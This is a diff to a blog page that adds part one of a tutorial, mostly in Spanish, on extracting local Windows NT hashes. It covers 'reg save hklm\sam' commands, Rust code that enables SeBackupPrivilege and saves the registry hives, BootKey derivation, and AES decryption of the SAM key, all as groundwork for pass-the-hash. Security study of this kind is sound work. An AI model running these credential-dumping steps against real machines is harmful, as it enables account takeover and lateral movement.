@@ -259,8 +259,254 @@ Y concatenamos su <em>class_name</em> en un solo string: <code>JD + Skew1 + GBG 
 <p class="has-line-data" data-line-start="289" data-line-end="290">Ya con los hashes NT podemos proceder a hacer el Pass-The-Hash, modificando la memoria del <code>LSASS</code>, de la que se hablará en la parte 2.</p>
 </div>
   <div id="content-en">
-    <h1>My Blog Title (English)</h1>
-    <p>This is the blog article in English. You can replace this with your real text.</p>
+<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="Pass-The-Crab-1"></a>Pass-The-Crab parte 1: Dumping the SAM and extracting system credentials</h1>
+<p class="has-line-data" data-line-start=0 data-line-end=1>Tags: <code>SAM, SYSTEM, AES, RC4, NT Hash, NTLM, Windows, Registry</code></p>
+<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="Introduccion_0"></a>Introduction</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">In a Discord server a challenge has been posted:</p>
+<p class="has-line-data" data-line-start="4" data-line-end="5"><em>“Create an user, add him to administrator group and execute a command using only his NT hash”</em></p>
+    <p class="has-line-data" data-line-start="6" data-line-end="7">Looks easy, right? A classic pass-the-hash. There are a lot of tools like <code>Mimikatz, Rupeus, Sharpkatz </code>, who already can do this, but there is the catch: whoever accomplish this task without depending on external tools will win moderation privilege.</p>
+<p class="has-line-data" data-line-start="8" data-line-end="9">I really want those privileges, and the task seems more interesting to do instead of relying on external tools. So i decided to accomplish this task without using the well-known tooling. This imply knowing the internal works of the Windows system, manually parsing the database that contains credentials and modify the involved services.</p>
+    <p class="has-line-data" data-line-start="10" data-line-end="11">In this post I'll explain the process of how it was done, it will be divided in various parts to don't make a single long post. In this part we are going to extract the hashes manually, using the <code><strong>Rust</strong></code> programming language (that's why this post is called "Pass-The-Crab", not so original I know...)</p>
+<p class="has-line-data" data-line-start="12" data-line-end="13">In the end we will have an executable that will receive an username, extract the hashes and spawn a command shell under that identity.</p>
+<p class="has-line-data" data-line-start="14" data-line-end="15"><em>⚠️ Warning ⚠️: I am not an expert in Windows Internals neither in Rust, I have roughly ~1 month experience in both so is possible that some of my assumptions are incorrect, if you find some mistake or if you just want to insult my gross code, reach me out on twitter @cyberdaemonum </em></p>
+<h2 class="code-line" data-line-start=16 data-line-end=17 ><a id="Hashes_y_contraseas_16"></a>Hashes and passwords</h2>
+<p class="has-line-data" data-line-start="18" data-line-end="19">El primer paso seria encontrar el hash de la contraseña del usuario.</p>
+<p class="has-line-data" data-line-start="20" data-line-end="21">Windows no almacena las contraseñas en texto plano, las almacena en forma de hashes NT (incorrectamente llamados NTLM hashes en algunos articulos), los cuales se generan aplicando una función hash irreversible sobre las claves.</p>
+    <p class="has-line-data" data-line-start="22" data-line-end="23">Este hash se guarda en una base de datos conocida como el <code><strong>SAM</strong></code> (Security Account Manager), la cual está protegida por una llave maestra que se encuentra en otro archivo llamado <code><strong>SYSTEM</strong></code>. Si logramos obtener ambos: el SAM y el SYSTEM podemos obtener todos los hashes de los usuarios en el sistema.</p>
+<p class="has-line-data" data-line-start="24" data-line-end="25">Estos se encuentran, fisicamente en el disco duro dentro de las rutas <code>C:\Windows\System32\config\SAM</code> y <code>C:\Windows\System32\config\SYSTEM</code>, pero están protegidas por el kernel mientras el sistema esté corriendo, por lo que no podemos extraerlos con facilidad.</p>
+<p class="has-line-data" data-line-start="26" data-line-end="27">Durante el arranque del sistema, estos archivos se cargan como llaves de registro, que sí pueden ser extraidas para posterior análisis. Por lo que vamos a usar el registro para hacer el volcado</p>
+<p class="has-line-data" data-line-start="28" data-line-end="29">Pero antes, ¿Qué es un registro? En windows el registro es un sistema de claves, donde cada clave tiene valores u otras claves (llamadas subclaves) que tambien pueden tener valores y otras subclaves, y así <em>ad infinitum</em> lo que lo convierte en un sistema <strong>jerarquizado</strong>, con una llave conteniendo valores y otras subllaves.</p>
+<p class="has-line-data" data-line-start="30" data-line-end="31"><em> Nota: En este artículo se usa la palabra "llave" para referirse a una llave del registro o a una llave criptográfica, dependiendo del contexto donde se use la palabra, el lector sabrá a cual de los dos es referido</em></p>
+<p class="has-line-data" data-line-start="30" data-line-end="31">Con esto en mente, ¿Dónde se encuentran los registros del SAM y el SYSTEM que necesitamos para extraer los hashes NT?</p>
+<p class="has-line-data" data-line-start="32" data-line-end="34">El SAM se encuentra en: <code>HKLM\SAM</code><br>
+El SYSTEM Se encuentra en: <code>HKLM\SYSTEM</code></p>
+<p class="has-line-data" data-line-start="35" data-line-end="36">El <code>HKLM</code> = <code>HKEY_LOCAL_MACHINE</code> es una de las colmenas (un contenedor lógico) mas importantes del sistema la cual almacena varias claves de configuración, entre ellas el SAM y el SYSTEM que necesitamos.</p>
+<h3 class="code-line" data-line-start=37 data-line-end=38 ><a id="Extrayendo_el_SAM_y_el_SYSTEM_37"></a>Extrayendo el SAM y el SYSTEM</h3>
+<p class="has-line-data" data-line-start="39" data-line-end="40">Para obtener estos registros necesitamos un permiso especial <code>SeBackupPrivilege</code> que nos permite hacer “backups” en el sistema, este permiso viene por defecto en usuarios en el grupo de Administradores. Si se encuentra un usuario cualquiera con este privilegio, puede abusarse para extraer el SAM y el SYSTEM (y para más cosas)</p>
+<p class="has-line-data" data-line-start="41" data-line-end="42">Podemos usar la utilidad <code>reg save</code> proporcionada por Windows que nos permite especificar una ruta donde se guardara una copia del registro</p>
+<p class="has-line-data" data-line-start="43" data-line-end="45"><code>reg save hklm\sam C:\Temp\sam</code><br>
+<code>reg save hklm\system C:\Temp\system</code></p>
+<p class="has-line-data" data-line-start="46" data-line-end="47">O hacerlo programáticamente, abriendo el registro con la funcion <code>RegOpenKeyExW</code> usando la flag <code>KEY_READ</code> seguido de usar la función<code>RegSaveKeyW</code> para guardar esta llave en una ubicación arbitraria. Este es el comportamiento que se realizará en el ejecutable final.</p>
+<p class="has-line-data" data-line-start="48" data-line-end="49">Lo siguiente es la función <code>save_registry</code> que guarda una llave que se encuentre en cualquier colmena.</p>
+<pre><code class="has-line-data" data-line-start="51" data-line-end="81">fn save_registry(hive: HKEY, subkey: &amp;str, path: &amp;str) {
+    unsafe {
+        let mut hkey: HKEY = null_mut();
+        let subkey_string: Vec&lt;u16&gt; = subkey.encode_utf16().chain(once(0)).collect();
+        let status = RegOpenKeyExW(hive,
+                                  subkey_string.as_ptr(),
+                                  0,
+                                  KEY_READ,
+                                  &amp;mut hkey);
+                                  
+        if status != ERROR_SUCCESS {
+            println!(&quot;Error in regopenkeyexw: {}&quot;, status);
+            return
+        }
+        
+        let path_string: Vec&lt;u16&gt; = path.encode_utf16().chain(once(0)).collect();
+        let status = RegSaveKeyW(hkey, 
+                                 path_string.as_ptr(),
+                                 null_mut());
+                                 
+        if status != ERROR_SUCCESS {
+            println!(&quot;Error in regsavekeyw: {}&quot;, status);
+            return
+        }
+        
+        RegCloseKey(hkey); // Closing the hkey handle when we are done
+    }
+    
+}
+</code></pre>
+<p class="has-line-data" data-line-start="82" data-line-end="83">La usamos para guardar el SAM y el SYSTEM en un archivo en la ruta temporal:</p>
+<p class="has-line-data" data-line-start="84" data-line-end="86"><code>save_registry(HKEY_LOCAL_MACHINE, &quot;SAM&quot;, &quot;C:\\Windows\\Temp\\SAM&quot;)</code><br>
+<code>save_registry(HKEY_LOCAL_MACHINE, &quot;SYSTEM&quot;, &quot;C:\\Windows\\Temp\\SYSTEM&quot;)</code></p>
+<p class="has-line-data" data-line-start="87" data-line-end="88">Pero antes de usarla, debemos habilitar el privilegio <code>SeBackupPrivilege</code> (se hablará sobre los privilegios y tokens de acceso más adelante, por ahora se deja la función como referencia)</p>
+<p class="has-line-data" data-line-start="89" data-line-end="90">La siguiente función debe ejecutarse antes de guardar los registros:</p>
+<pre><code class="has-line-data" data-line-start="92" data-line-end="124">fn enable_backup_privilege() -&gt; bool {
+    unsafe {
+        let mut token: HANDLE = INVALID_HANDLE_VALUE;
+        if OpenProcessToken(GetCurrentProcess(),
+                            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+                            &amp;mut token) == 0 {
+            return false;
+        }
+        
+        let mut luid = LUID { LowPart: 0, HighPart: 0 };
+        if LookupPrivilegeValueW(null_mut(),
+                                w!(&quot;SeBackupPrivilege&quot;),
+                                &amp;mut luid) == 0 {
+            return false;
+        }
+        
+        let tp = TOKEN_PRIVILEGES {
+            PrivilegeCount: 1,
+            Privileges: [LUID_AND_ATTRIBUTES
+                        { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
+        };
+        
+        AdjustTokenPrivileges(token,
+                              0,
+                              &amp;tp as *const _ as _,
+                              0,
+                              null_mut(),
+                              null_mut());
+        GetLastError() == 0
+    }
+}
+</code></pre>
+<p class="has-line-data" data-line-start="125" data-line-end="126">Y con esto ya tendremos una copia del SAM y del SYSTEM que podemos usar para extraer los hashes</p>
+<h2 class="code-line" data-line-start=127 data-line-end=128 ><a id="Obteniendo_la_BootKey_127"></a>Obteniendo la BootKey</h2>
+<p class="has-line-data" data-line-start="129" data-line-end="130">La BootKey es la llave dentro de SYSTEM usada para derivar la clave que protege los hashes. Se encuentra repartida entre 4 keys dentro del SYSTEM: <strong>JD</strong>, <strong>Skew1</strong>, <strong>GBG</strong> y <strong>Data</strong> .</p>
+<p class="has-line-data" data-line-start="131" data-line-end="132">Estas keys se encuentran dentro de la ruta del SYSTEM: <code>CurrentControlSet[NUMERO]\Control\Lsa\</code> y su informacion está almacenada en el atributo de la clase como un string Unicode</p>
+<p class="has-line-data" data-line-start="133" data-line-end="134">El proceso de extracción es el siguiente:</p>
+<ol>
+<li class="has-line-data" data-line-start="135" data-line-end="136">Abrimos el SYSTEM  y obtenemos el numero del ControlSet activo leyendo el valor de la llave en <code>Select\Current</code></li>
+<li class="has-line-data" data-line-start="136" data-line-end="141">Con este valor construimos el path exacto donde se encuentran las 4 keys: <code>ControlSet[VALOR]\Control\Lsa\JD</code><br>
+<code>ControlSet[VALOR]\Control\Lsa\Skew1</code><br>
+<code>ControlSet[VALOR]\Control\Lsa\GBG</code><br>
+<code>ControlSet[VALOR]\Control\Lsa\Data</code><br>
+Y concatenamos su <em>class_name</em> en un solo string: <code>JD + Skew1 + GBG + Data</code> que es una secuencia de bytes en formato hexadecimal.</li>
+<li class="has-line-data" data-line-start="141" data-line-end="143">Esta secuencia de bytes aún no es la <strong>bootkey</strong>, Windows aplica una transformación a los bytes para obfuscar la llave final, la transformación es: <code>[8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]</code> Es decir, el byte 8 de la secuencia pasa a ser el primero, el byte 5 el segundo y así.</li>
+</ol>
+<p class="has-line-data" data-line-start="143" data-line-end="144">Con la transformación aplicada ya tenemos la BootKey</p>
+<p class="has-line-data" data-line-start="145" data-line-end="146">La funcion <code>extract_system_bootkey</code> implementa los pasos anteriores, cada parte del paso está enumerada con comentarios:</p>
+<pre><code class="has-line-data" data-line-start="148" data-line-end="193">fn extract_system_bootkey(system_path: &amp;str) -&gt; Result&lt;[u8; 16], String&gt; {
+
+    ///    (1)     ///
+    
+    let mut buf = Vec::&lt;u8&gt;::new();
+    let mut f = File::open(system_path).map_err(|e| format!(&quot;Error opening hive file: {e}&quot;))?;
+    f.read_to_end(&amp;mut buf).map_err(|e| format!(&quot;Error reading hive file: {e}&quot;))?;
+    let hive = Hive::new(buf.as_ref()).map_err(|e| format!(&quot;Error parsing hive file: {e}&quot;))?;
+    let root_key = hive.root_key_node().map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?;
+    let select_node = root_key.subkey(&quot;Select&quot;).expect(&quot;Select not found&quot;).map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?;
+    let current_val = select_node.value(&quot;Current&quot;).expect(&quot;Current not found&quot;).map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?; 
+    let current = current_val.dword_data().map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?;
+
+    ///    (2)     ///
+    
+    let control_set = format!(&quot;ControlSet{:03}&quot;, current);
+    let keys = [&quot;JD&quot;, &quot;Skew1&quot;, &quot;GBG&quot;, &quot;Data&quot;];
+    let mut tmp_hex = String::new();
+
+    for k in &amp;keys {
+        let path = format!(&quot;{}\\Control\\Lsa\\{}&quot;, control_set, k);
+        let node = root_key.subpath(&amp;path).expect(&quot;Path not found&quot;).map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?;
+        let class_name = node.class_name().expect(&quot;Class_name not found&quot;).map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?;
+
+        tmp_hex.push_str(&amp;class_name.to_string_lossy());
+    }
+
+    let tmp_bytes = hex::decode(&amp;tmp_hex).map_err(|e| format!(&quot;Error getting root key: {e}&quot;))?;
+
+    if tmp_bytes.len() &lt; 16 {
+        return Err(&quot;Not enough longitude&quot;.to_string());
+    }
+
+    ///    (3)    ///
+    
+    let transforms: [usize; 16] = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];
+    let mut bootkey = [0u8; 16];
+    for (i, &amp;t) in transforms.iter().enumerate() {
+        bootkey[i] = tmp_bytes[t];
+    }
+
+    Ok(bootkey)
+}
+
+</code></pre>
+<h2 class="code-line" data-line-start=194 data-line-end=195 ><a id="Descifrando_los_hashes_NT_194"></a>Descifrando los hashes NT</h2>
+<p class="has-line-data" data-line-start="196" data-line-end="197">Los hashes en el SAM no están encriptados directamente con la BootKey, sino protegidos por otra clave llamada <strong>SAM Key</strong> que se deriva de la BootKey.</p>
+<p class="has-line-data" data-line-start="198" data-line-end="199">Para obtener la SAM Key, Windows toma el valor <code>F</code> que está en la ruta: <code>SAM\Domains\Account</code> del SAM que ya extraimos.</p>
+<pre><code class="has-line-data" data-line-start="200" data-line-end="236">    // 1) Read SAM file
+    let mut buf = Vec::&lt;u8&gt;::new();
+    let mut f = File::open(sam_path)
+        .map_err(|e| format!(&quot;Error opening hive SAM '{}': {}&quot;, sam_path, e))?;
+    f.read_to_end(&amp;mut buf)
+        .map_err(|e| format!(&quot;Error reader hive SAM '{}': {}&quot;, sam_path, e))?;
+
+    // 2) Get Hive
+    let hive = Hive::new(buf.as_ref())
+        .map_err(|e| format!(&quot;Error parsing hive SAM: {}&quot;, e))?;
+
+    // 3) Get root key
+    let root = hive.root_key_node()
+        .map_err(|e| format!(&quot;Error parsing root node under hive: {}&quot;, e))?;
+
+    // 4) Navigate into SAM\Domains\Account\
+    let sam_node = match root.subkey(&quot;SAM&quot;) {
+        Some(res) =&gt; res.map_err(|e| format!(&quot;Error subkey SAM: {}&quot;, e))?,
+        None =&gt; return Err(&quot;Couldn't find 'SAM' under hive&quot;.into()),
+    };
+    let domains_node = match sam_node.subkey(&quot;Domains&quot;) {
+        Some(res) =&gt; res.map_err(|e| format!(&quot;Error subkey Domains: {}&quot;, e))?,
+        None =&gt; return Err(&quot;Couldn't find 'Domains' under SAM&quot;.into()),
+    };
+
+    let account_node = match domains_node.subkey(&quot;Account&quot;) {
+        Some(res) =&gt; res.map_err(|e| format!(&quot;Error subkey Account: {}&quot;, e))?,
+        None =&gt; return Err(&quot;Couldn't find 'Account' under Domains&quot;.into()),
+    };
+    
+    // 5) Get &quot;F&quot; Data
+    #[allow(non_snake_case)]
+    let F = account_node.value(&quot;F&quot;).expect(&quot;Not Found&quot;).map_err(|e| format!(&quot;Error in F: {e}&quot;));
+    #[allow(non_snake_case)]
+    let F_data = F?.data().expect(&quot;Couldn't extract data&quot;);
+</code></pre>
+<p class="has-line-data" data-line-start="236" data-line-end="237">Dentro de este valor, a partir de la posición <code>0x68</code>, se encuentra un atributo llamado <strong>Key0</strong>. Este dato está cifrado.</p>
+<p class="has-line-data" data-line-start="238" data-line-end="239">Desciframos este dato usando la <strong>BootKey</strong> como llave maestra, aplicando <strong>AES o RC4</strong> (dependiendo de la versión de Windows).  El resultado de ese descifrado es la <strong>SAM Key</strong>, que luego se usará para descifrar los hashes NT de las cuentas locales.</p>
+<pre><code class="has-line-data" data-line-start="240" data-line-end="264">    let mut sam_key: Vec&lt;u8&gt; = vec![];
+    match F_data {
+        KeyValueData::Small(data) =&gt; {
+
+            let keys0 = &amp;data[0x68..];
+            if keys0[1] == 0x1 {
+                println!(&quot;RC4&quot;); // We dont care about RC4 because is not present on modern systems, 
+                                 // if you care, you can implement the logic here
+                return Ok(())
+            }
+            else if keys0[0] == 0x02 {
+                let data_len = u32::from_le_bytes(keys0[12..16].try_into().unwrap()) as usize;
+                let aes_salt = &amp;keys0[16..32];
+                let aes_data = &amp;keys0[32..32 + data_len];
+
+                sam_key = decrypt_aes(&amp;syskey, aes_data, aes_salt)
+        .map_err(|e| format!(&quot;AES decrypt error: {}&quot;, e))?;
+
+
+            }
+        },
+        _ =&gt; todo!()
+    }
+</code></pre>
+<p class="has-line-data" data-line-start="265" data-line-end="266">Y ya con esto tenemos la llave maestra para descifrar los hashes.</p>
+<p class="has-line-data" data-line-start="267" data-line-end="268">Dentro de <code>Account</code> se encuentra una subllave <code>Users</code> que guarda toda la información de los usuarios como subllaves, con el RID (un numero identificador) del usuario como nombre de la subllave.</p>
+<p class="has-line-data" data-line-start="269" data-line-end="270">Cada una de esas subllaves tiene un valor <code>V</code> que guarda el cuerpo binario de la cuenta de usuario, en este cuerpo está valores como el nombre de la cuenta y el NT hash.</p>
+<p class="has-line-data" data-line-start="271" data-line-end="272">Para desencriptar el NT hash se sigue el siguiente proceso:</p>
+<ul>
+<li class="has-line-data" data-line-start="273" data-line-end="275">Extraer el blob <code>V</code> de la subclave del usuario y localizar dentro de él el NT hash cifrado.</li>
+</ul>
+<ul>
+<li class="has-line-data" data-line-start="275" data-line-end="277">
+<p class="has-line-data" data-line-start="275" data-line-end="276">Usar la <strong>SAM Key</strong> junto con una salt incluida en el blob para descifrar con AES/RC4 el material cifrado del hash.</p>
+</li>
+<li class="has-line-data" data-line-start="277" data-line-end="279">
+<p class="has-line-data" data-line-start="277" data-line-end="278">Derivar dos claves DES a partir del RID del usuario.</p>
+</li>
+<li class="has-line-data" data-line-start="279" data-line-end="281">
+<p class="has-line-data" data-line-start="279" data-line-end="280">Usar estas dos claves DES para descifrar los 16 bytes obtenidos en el paso anterior (primera mitad con la primera clave, segunda mitad con la segunda).</p>
+</li>
+<li class="has-line-data" data-line-start="281" data-line-end="283">
+<p class="has-line-data" data-line-start="281" data-line-end="282">Concatenar ambos resultados: el valor final son los 16 bytes del <strong>NT hash en claro</strong> del usuario.</p>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="283" data-line-end="284">Y ya con esto tenemos los NT hashes descifrados para todas las cuentas.</p>
+<p class="has-line-data" data-line-start="285" data-line-end="286">El código que lidia con esta parte es un poco extenso para ponerlo aquí, puedes verlo en el repositorio dando click [aqui]</p>
+<p class="has-line-data" data-line-start="287" data-line-end="288">El código completo de la herramienta que obtiene el SAM, el SYSTEM y desencripta las NT hashes puede ser descargado de aqui: [link]. La mayoría de funcionalidades es una adaptación de el modulo SAMHashes de <code>secretsdump.py</code> de Impacket. Un agradecimiento a ellos por darse en la labor de encontrar las estructuras y procedimientos adecuados, de las que este blog depende.</p>
+<p class="has-line-data" data-line-start="289" data-line-end="290">Ya con los hashes NT podemos proceder a hacer el Pass-The-Hash, modificando la memoria del <code>LSASS</code>, de la que se hablará en la parte 2.</p>
+
   </div>
 
   <script>
